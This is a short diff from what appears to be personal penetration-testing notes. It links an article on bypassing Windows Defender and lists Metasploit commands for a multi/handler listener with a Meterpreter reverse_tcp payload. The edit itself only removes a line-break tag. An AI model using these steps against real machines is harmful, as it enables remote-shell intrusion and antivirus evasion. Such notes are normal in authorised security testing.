@@ -13,7 +13,7 @@ Working exploit that avoids windows defender:<br>
 https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon
 
 #### Host:
-<br>
+
 - MSFCONSOLE<br>
     - use /exploit/multi/handler<br>
 	- set payload windows/meterpreter/reverse_tcp<br>
